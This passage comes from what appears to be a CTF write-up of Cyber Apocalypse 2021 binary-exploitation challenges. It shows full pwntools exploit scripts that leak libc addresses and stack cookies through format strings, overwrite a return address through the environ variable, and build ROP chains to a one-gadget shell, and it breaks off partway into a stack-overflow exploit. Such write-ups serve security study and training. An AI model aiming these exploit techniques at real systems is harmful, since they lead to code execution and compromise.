+</span></span><span style=display:flex><span>    <span style=color:#75715e># 1. Leak ASLR and stack cookie with format string in fight</span>
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&gt; &#39;</span>)
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&gt; &#39;</span>)
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%3$p&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&gt; &#39;</span>)
+</span></span><span style=display:flex><span>    m <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Your choice is: (0x[a-fA-F0-9]+)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>, data)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>assert</span>(m)
+</span></span><span style=display:flex><span>    libc_leak <span style=color:#f92672>=</span> int(m<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>), <span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    libc_base <span style=color:#f92672>=</span> libc_leak <span style=color:#f92672>-</span> <span style=color:#ae81ff>0xe4774</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>assert</span>((libc_base <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xfff</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&gt; &#39;</span>)
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%15$p&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&gt; &#39;</span>)
+</span></span><span style=display:flex><span>    m <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Your choice is: (0x[a-fA-F0-9]+00)&#39;</span>, data)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>assert</span>(m)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    cookie <span style=color:#f92672>=</span> int(m<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>), <span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Libc base: </span><span style=color:#e6db74>%x</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> libc_base)
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Cookie: </span><span style=color:#e6db74>%x</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> cookie)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># 2. Stealing pies with inventory function</span>
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&gt; &#39;</span>)
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;y&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&gt; &#39;</span>)
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;-11&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&gt; &#39;</span>)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># 3. Exploitation</span>
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;3&#39;</span>)
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&gt; &#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    ropchain <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    one_gadget <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4f3d5</span>
+</span></span><span style=display:flex><span>    ropchain <span style=color:#f92672>+=</span> flat({
+</span></span><span style=display:flex><span>      <span style=color:#ae81ff>40</span>: p64(cookie),
+</span></span><span style=display:flex><span>      <span style=color:#ae81ff>56</span>: p64(libc_base <span style=color:#f92672>+</span> one_gadget),
+</span></span><span style=display:flex><span>    }, length<span style=color:#f92672>=</span><span style=color:#ae81ff>64</span>, filler<span style=color:#f92672>=</span>cyclic(<span style=color:#ae81ff>64</span>, n<span style=color:#f92672>=</span><span style=color:#ae81ff>8</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>send(ropchain)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>interactive()
+</span></span></code></pre></div><h2 id=save-the-environment---difficulty-24>Save the environment - Difficulty 2/4</h2><p><em>Challenge files: <a href=/posts/binaries/Cyber_Apocalypse_2021/pwn_save_the_environment.zip>pwn_save_the_environment.zip</a></em></p><p>The <code>environment</code> binary is an 64bits ELF that allows to plant or recycle.</p><p><a href=/posts/img/Cyber_Apocalypse_2021-environment.png target=_blank><img src=/posts/img/Cyber_Apocalypse_2021-environment.png alt=fig_environment></a></p><p>Rapidly we view that the challenge is to exploit the binary and not to find bugs. Indeed the vulnerabilities are trivially discovered:</p><ul><li>A leak to <code>printf</code> inside the function <code>recycle->form</code> after 5 reclycle command</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#a6e22e>color</span>(<span style=color:#e6db74>&#34;You have already recycled at least 5 times! Please accept this gift: &#34;</span>, <span style=color:#e6db74>&#34;magenta&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[%p]</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#f92672>&amp;</span>printf);
+</span></span></code></pre></div><ul><li>An arbitrary read inside the function <code>recycle->form</code> after 10 reclycle command</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#a6e22e>color</span>(<span style=color:#e6db74>&#34;You have recycled 10 times! Feel free to ask me whatever you want.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&gt; &#34;</span>, <span style=color:#e6db74>&#34;cyan&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>read</span>(<span style=color:#ae81ff>0</span>, nptr, <span style=color:#ae81ff>0x10uLL</span>);
+</span></span><span style=display:flex><span>s <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#a6e22e>strtoull</span>(nptr, <span style=color:#ae81ff>0LL</span>, <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>puts</span>(s);
+</span></span></code></pre></div><ul><li>An arbitrary write inside the function <code>plant</code>, as already used in <a href=#minefield---difficulty-14>minefield</a></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;&gt; &#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>read</span>(<span style=color:#ae81ff>0</span>, buff, <span style=color:#ae81ff>0x10uLL</span>);
+</span></span><span style=display:flex><span>target_addr <span style=color:#f92672>=</span> (_QWORD <span style=color:#f92672>*</span>)<span style=color:#a6e22e>strtoull</span>(buff, <span style=color:#ae81ff>0LL</span>, <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>putchar</span>(<span style=color:#ae81ff>10</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>color</span>(<span style=color:#e6db74>&#34;Where do you want to plant?</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>1. City</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>2. Forest</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;green&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;&gt; &#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>read</span>(<span style=color:#ae81ff>0</span>, value, <span style=color:#ae81ff>0x10uLL</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Thanks a lot for your contribution!&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#f92672>*</span>target_addr <span style=color:#f92672>=</span> <span style=color:#a6e22e>strtoull</span>(target_value, <span style=color:#ae81ff>0LL</span>, <span style=color:#ae81ff>0</span>);
+</span></span></code></pre></div><ul><li>A win function <code>hidden_resources</code> at address <code>0x4010B5</code> to read the flag<ul><li>There is no need to get a shell</li></ul></li></ul><p>The libc used by the binary is provided with this challenge.</p><h3 id=attack-method-4>Attack method</h3><p>The difficult part here is to get control of RIP.</p><p>Protections are as follow:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;environment&#39;</span>
+</span></span><span style=display:flex><span>    Arch:     amd64-64-little
+</span></span><span style=display:flex><span>    RELRO:    Full RELRO
+</span></span><span style=display:flex><span>    Stack:    Canary found
+</span></span><span style=display:flex><span>    NX:       NX enabled
+</span></span><span style=display:flex><span>    PIE:      No PIE <span style=color:#f92672>(</span>0x400000<span style=color:#f92672>)</span>
+</span></span></code></pre></div><p>The binary is not PIE so we can simply use addresses without leaking the base address of the binary.</p><p>We first try to overwrite hooks such <code>__malloc_hook</code> or <code>__free_hook</code> inside libc but it is impossible to trigger a malloc or a free so overwrite these variables has no effect. Another attempt we made is to overwrite the function pointers in <code>.fini_array</code> section but this location is read only this time.</p><p>We then wanted to leak a stack address to overwrite a saved return address but how to find a saved return address at a predictible location ? The answer comes from the name of the challenge (and <a href=https://github.com/Naetw/CTF-pwn-tips#leak-stack-address>this article</a>): the <strong>environ</strong> variable inside the libc ! Good thing we have a <code>printf</code> leak to get the libc base address and calculate the address of <strong>environ</strong> variable !</p><p>Perfect ! We have all the elements to exploit this binary.</p><h3 id=exploitation-3>Exploitation</h3><p>The final exploitation is:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>exploit</span>(p, elf, libc):
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    printf_offset  <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;printf&#39;</span>]
+</span></span><span style=display:flex><span>    environ_offset <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#34;environ&#34;</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Trigger printf leak by recycling </span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>6</span>):
+</span></span><span style=display:flex><span>        p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&gt; &#39;</span>)
+</span></span><span style=display:flex><span>        p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>        p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&gt; &#39;</span>)
+</span></span><span style=display:flex><span>        p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>        p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&gt; &#39;</span>)
+</span></span><span style=display:flex><span>        p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#39;n&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Read printf leak by recycling </span>
+</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&gt; &#39;</span>)
+</span></span><span style=display:flex><span>    pattern <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;his gift: .+\[(0x[0-9a-f]+)\]&#39;</span>
+</span></span><span style=display:flex><span>    result <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(pattern, str(data))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> result:
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;FAIL&#34;</span>)
+</span></span><span style=display:flex><span>        exit(<span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    leak_printf <span style=color:#f92672>=</span> int(result[<span style=color:#ae81ff>1</span>], <span style=color:#ae81ff>16</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Leak printf: </span><span style=color:#e6db74>%x</span><span style=color:#e6db74> - Printf offset: </span><span style=color:#e6db74>%x</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> (leak_printf, printf_offset))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    libc_base <span style=color:#f92672>=</span> leak_printf <span style=color:#f92672>-</span> printf_offset
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Libc base: </span><span style=color:#e6db74>%x</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> libc_base)
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Environ read addr </span><span style=color:#e6db74>%x</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> (environ_offset <span style=color:#f92672>+</span> libc_base))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Trigger environ leak by recycling</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>10</span>):
+</span></span><span style=display:flex><span>        p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;2&#34;</span>)
+</span></span><span style=display:flex><span>        p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&gt; &#34;</span>)
+</span></span><span style=display:flex><span>        p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;1&#34;</span>)
+</span></span><span style=display:flex><span>        p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&gt; &#34;</span>)
+</span></span><span style=display:flex><span>        p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;n&#34;</span>)
+</span></span><span style=display:flex><span>        p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&gt; &#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    toSend <span style=color:#f92672>=</span> hex(environ_offset <span style=color:#f92672>+</span> libc_base)
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(toSend)
+</span></span><span style=display:flex><span>    environ_leak <span style=color:#f92672>=</span> u64(p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&gt; &#34;</span>)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)[<span style=color:#ae81ff>0</span>][<span style=color:#f92672>-</span><span style=color:#ae81ff>6</span>:] <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00\x00</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Environ value: </span><span style=color:#e6db74>%x</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> environ_leak)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    fct_hidden_resources <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4010B5</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    target <span style=color:#f92672>=</span> environ_leak <span style=color:#f92672>-</span> <span style=color:#ae81ff>280</span>  <span style=color:#75715e># 280 with dbg #288 into the remote</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Use plant functionnality to overwrite function return</span>
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;1&#34;</span>)
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&gt; &#34;</span>)
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;0x</span><span style=color:#e6db74>%08x</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> target)
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&gt; &#34;</span>)
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;0x</span><span style=color:#e6db74>%08x</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> fct_hidden_resources)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>interactive()
+</span></span></code></pre></div><p>The exploit result:</p><p><a href=/posts/img/Cyber_Apocalypse_2021-environment_win.png target=_blank><img src=/posts/img/Cyber_Apocalypse_2021-environment_win.png alt=fig_environment_win></a></p><h2 id=close-the-door---difficulty-24>Close the door - Difficulty 2/4</h2><p><em>Challenge files: <a href=/posts/binaries/Cyber_Apocalypse_2021/misc_close_the_door.zip>misc_close_the_door.zip</a></em></p><p><code>Close the door</code> is a <strong>64 bits ELF</strong>:</p><p><a href=/posts/img/Cyber_Apocalypse_2021-close_the_door.png target=_blank><img src=/posts/img/Cyber_Apocalypse_2021-close_the_door.png alt=fig_close_the_door></a></p><p>The libc used by the binary is provided with this challenge.</p><h3 id=attack-method-5>Attack method</h3><p>Protections are as follow:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;close_the_door&#39;</span>
+</span></span><span style=display:flex><span>    Arch:     amd64-64-little
+</span></span><span style=display:flex><span>    RELRO:    Full RELRO
+</span></span><span style=display:flex><span>    Stack:    No canary found
+</span></span><span style=display:flex><span>    NX:       NX enabled
+</span></span><span style=display:flex><span>    PIE:      No PIE <span style=color:#f92672>(</span>0x400000<span style=color:#f92672>)</span>
+</span></span></code></pre></div><p>No PIE and No canary found, looks like a stack overflow !</p><p><code>hidden_function</code> holds the vulnerable part, with a clean stack overflow:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>__int64</span> buf[<span style=color:#ae81ff>4</span>]; <span style=color:#75715e>// [rsp+10h] [rbp-40h] BYREF
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>int</span> v3; <span style=color:#75715e>// [rsp+30h] [rbp-20h]
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>int</span> v4; <span style=color:#75715e>// [rsp+34h] [rbp-1Ch]
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>v5; <span style=color:#75715e>// [rsp+38h] [rbp-18h]
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>int</span> v6; <span style=color:#75715e>// [rsp+44h] [rbp-Ch]
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>s; <span style=color:#75715e>// [rsp+48h] [rbp-8h]
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>[...]
+</span></span><span style=display:flex><span>s <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Do you think this is the secret password?</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&gt; &#34;</span>;
+</span></span><span style=display:flex><span>v6 <span style=color:#f92672>=</span> <span style=color:#a6e22e>strlen</span>(<span style=color:#e6db74>&#34;Do you think this is the secret password?</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&gt; &#34;</span>);
+</span></span><span style=display:flex><span>v5 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;At least we tried...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
+</span></span><span style=display:flex><span>v4 <span style=color:#f92672>=</span> <span style=color:#a6e22e>strlen</span>(<span style=color:#e6db74>&#34;At least we tried...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>[...]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>write</span>(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;Do you think this is the secret password?</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&gt; &#34;</span>, v6);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>read</span>(<span style=color:#ae81ff>0</span>, buf, <span style=color:#ae81ff>0x464uLL</span>);  <span style=color:#75715e>// Stack overflow !
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>write</span>(<span style=color:#ae81ff>1</span>, v5, v4);
+</span></span></code></pre></div><p>However, when overwriting the stack, one has to be cautious not to screw arguments used to perform the write just after:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>strace .<span style=color:#f92672>/</span>close_the_door
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>read</span>(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>42</span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;4&#34;</span>, <span style=color:#ae81ff>1</span>)                         <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>read</span>(<span style=color:#ae81ff>0</span>, <span style=color:#e6db74>&#34;2&#34;</span>, <span style=color:#ae81ff>1</span>)                         <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>read</span>(<span style=color:#ae81ff>0</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>1</span>)                        <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>write</span>(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;You found something interesting!&#34;</span>..., <span style=color:#ae81ff>33</span>You found something interesting<span style=color:#f92672>!</span>
+</span></span><span style=display:flex><span>) <span style=color:#f92672>=</span> <span style=color:#ae81ff>33</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>write</span>(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;Do you think this is the secret &#34;</span>..., <span style=color:#ae81ff>44</span>Do you think this is the secret password<span style=color:#f92672>?</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&gt;</span> ) <span style=color:#f92672>=</span> <span style=color:#ae81ff>44</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>read</span>(<span style=color:#ae81ff>0</span>, XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&#34;</span>..., <span style=color:#ae81ff>1124</span>) <span style=color:#f92672>=</span> <span style=color:#ae81ff>41</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>write</span>(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;SA</span><span style=color:#ae81ff>\211\375</span><span style=color:#e6db74>I</span><span style=color:#ae81ff>\211\366</span><span style=color:#e6db74>L)</span><span style=color:#ae81ff>\345</span><span style=color:#e6db74>H</span><span style=color:#ae81ff>\203\354\10</span><span style=color:#e6db74>H</span><span style=color:#ae81ff>\301\375\3\350\17\373\377\377</span><span style=color:#e6db74>H</span><span style=color:#ae81ff>\205\355</span><span style=color:#e6db74>t 1</span><span style=color:#ae81ff>\333\17\37</span><span style=color:#e6db74>&#34;</span>..., <span style=color:#ae81ff>1482184792</span>) <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#a6e22e>EFAULT</span> (Bad address)
+</span></span></code></pre></div><p>Both second and third arguments were overwritten by our <code>X</code>s slide, making the length goes wild, and pointing to an unexpected - yet valid - memory area.</p><h3 id=exploit>Exploit</h3><p>We will turn it into our advantage: we can give to the <code>write</code> function crafted arguments to leak us a libc address. Subsequent <code>read</code> allows us to inject the computed address of the one-gadget to get a shell.</p><p>Our selection for leaking libc address is the GOT entry of alarm:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> flat, p32
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> struct <span style=color:#f92672>import</span> unpack
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>exploit</span>(p, elf, libc):
+</span></span><span style=display:flex><span>   p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&gt; &#39;</span>)
+</span></span><span style=display:flex><span>   p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;yolo&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>   <span style=color:#75715e># Select 42 to access to hidden function</span>
+</span></span><span style=display:flex><span>   p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&gt; &#39;</span>)
+</span></span><span style=display:flex><span>   p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#39;42&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>   p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&gt; &#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>   <span style=color:#75715e># 0x8 -&gt; read 8 bytes (rdx value)</span>
+</span></span><span style=display:flex><span>   ropchain <span style=color:#f92672>=</span> flat({
